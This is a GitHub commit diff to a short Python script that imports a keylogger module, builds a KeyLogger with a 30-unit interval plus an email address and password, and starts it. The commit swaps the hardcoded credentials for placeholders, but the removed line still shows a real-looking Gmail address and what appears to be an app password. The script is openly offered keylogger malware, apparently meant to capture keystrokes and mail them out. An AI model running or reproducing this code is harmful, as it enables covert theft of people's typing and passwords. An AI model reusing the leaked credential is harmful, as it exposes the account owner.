cd2619e61386fc120cb86d1536c24e3f78969217
Dhruv Gadewar <163728245+dhruvgadewar@users.noreply.github.com>
2024-06-14 12:35:39 +0530

    Update Dhruv_keylogger.py

--- Dhruv_keylogger.py
+++ Dhruv_keylogger.py
@@ -1,7 +1,7 @@
 import keylogger_03
 
 # Create an instance of the KeyLogger class
-my_keylogger = keylogger_03.KeyLogger(30, "dhruvgadewar123@gmail.com", "ppoa rirb ayqs lmfx")
+my_keylogger = keylogger_03.KeyLogger(30, "your_mailID", "Your_password")
 
 # Start the keylogger
 my_keylogger.start()
